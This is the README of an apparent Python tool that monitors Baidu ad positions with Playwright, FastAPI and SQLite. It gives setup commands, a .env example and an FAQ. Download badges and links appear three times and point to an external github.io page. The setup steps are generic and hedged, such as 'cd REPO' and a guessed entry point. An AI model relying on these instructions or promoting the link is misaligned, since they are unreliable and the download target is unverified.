# Baidu Rank Checker - Advertising Rank Monitoring 2026

> **Baidu Rank Checker is a cross-platform Python tool for querying, examining, and monitoring Baidu advertising positions using SERP scans, live previews, and saved reports.**

[![Platform](https://img.shields.io/badge/Platform-Python%20cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/jason-peters71/baidu-serp-rank-checker?style=flat-square)](https://github.com/jason-peters71/baidu-serp-rank-checker)

---

<p align="center">
  <a href="https://jason-peters71.github.io/baidu-serp-rank-checker/">
    <img src="https://img.shields.io/badge/Download-Baidu%20Rank%20Checker%20Latest-brightgreen?style=for-the-badge" alt="Download Baidu Rank Checker">
  </a>
</p>

> **[Download Baidu Rank Checker](https://jason-peters71.github.io/baidu-serp-rank-checker/)**

---

[Download Latest Build](https://jason-peters71.github.io/baidu-serp-rank-checker/)

---

## What Baidu Rank Checker Does

Baidu Rank Checker supports advertising and search-position analysis on Baidu. Public SERP advertising checks can be performed without signing in, while authenticated live preview checks are available for workflows that depend on an active account session.

Under the hood, the application uses Playwright for browser automation, FastAPI for its web interface, and SQLite for persistent result storage. Analysts can revisit previous checks, measure position changes, view trend charts, and keep screenshots and related measurement data with each query.

---

## Capabilities

- Automatically check Baidu advertising positions for chosen keywords.
- Inspect public SERP advertising results without an account login.
- Run authenticated Baidu live preview checks with a persistent browser profile.
- Schedule or perform several monitoring rounds to track position movement.
- Compare separate runs through rank-change summaries and trend visualizations.
- Access scan records, reports, and query history from the web interface.
- Save landing-page screenshots together with objective page metrics.
- Keep detailed queries, results, and screenshots in SQLite storage.

---

## Getting Started

First clone the repository and move into the project directory:

```bash
git clone https://github.com/jason-peters71/baidu-serp-rank-checker.git
cd REPO
```

Set up a virtual environment:

```bash
python -m venv .venv
```

Activate it on macOS or Linux:

```bash
source .venv/bin/activate
```

For Windows PowerShell, run:

```powershell
.venv\Scripts\Activate.ps1
```

Install the Python packages and download the browser components required by Playwright:

```bash
pip install -r requirements.txt
playwright install
```

Run the FastAPI service with the entry point configured by the repository. A standard command is:

```bash
uvicorn app:app --reload
```

If the application uses another module or object name, substitute the repository's configured entry point for `app:app`.

---

## Running a Monitoring Check

The usual process looks like this:

1. Start the FastAPI server.
2. Visit the local web application in your browser.
3. Enter the Baidu keywords and configure the scan options.
4. Choose either a public SERP scan or an authenticated live preview.
5. Perform one monitoring round or several.
6. Examine advertising positions, screenshots, logs, and landing-page metrics.
7. Compare new checks with earlier runs to identify movement and trends.

The server can also be started directly from the command line:

```bash
uvicorn app:app --reload
```

Playwright controls the browser used during each scan. For logged-in checks, the persistent browser profile can preserve session information so it remains available for subsequent runs.

---

## Settings and Environment

Project settings are defined through the Python configuration and environment setup. Where supported, deployment-specific values may be placed in a local environment file:

```ini
# .env
HOST=127.0.0.1
PORT=8000
DATABASE_PATH=./data/results.sqlite3
BROWSER_PROFILE_PATH=./data/browser-profile
```

The exact variable names must match those used by the repository's configuration code. Store the browser profile and scan database in directories with suitable access controls.

---

## System Requirements

- Python with all packages listed in `requirements.txt`.
- A supported desktop or server operating system where Python is available.
- Playwright and its browser binaries.
- Network connectivity to Baidu for live SERP and preview requests.
- Writable locations for the SQLite database, screenshots, logs, and browser profile.
- A current web browser for opening the FastAPI interface.

---

## Common Questions

### Is a Baidu account needed for all scans?

No. Public SERP advertising scans work without authentication. A logged-in live preview is available when the selected workflow requires an authenticated browser session.

### What happens to scan data?

Results are written to SQLite. Depending on the configured paths, screenshots, browser profile information, and detailed logs also need writable local storage.

### Can the same keywords be checked more than once?

Yes. Multiple monitoring rounds can be run, making it possible to compare rank changes and identify trends over time.

### How can I keep an authenticated browser session?

Configure and reuse the application's persistent browser profile. Its location should stay consistent between runs so Playwright can access the saved session state.

### What should I do if Playwright cannot launch the browser?

Make sure Playwright and its browser components are installed:

```bash
playwright install
```

Then check that the intended Python virtual environment is active and that the configured browser-profile directory allows writing.

### Where can I find newer versions?

Look in the repository for newer builds, dependency changes, and revised startup instructions:

[View the project repository](https://github.com/jason-peters71/baidu-serp-rank-checker)

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
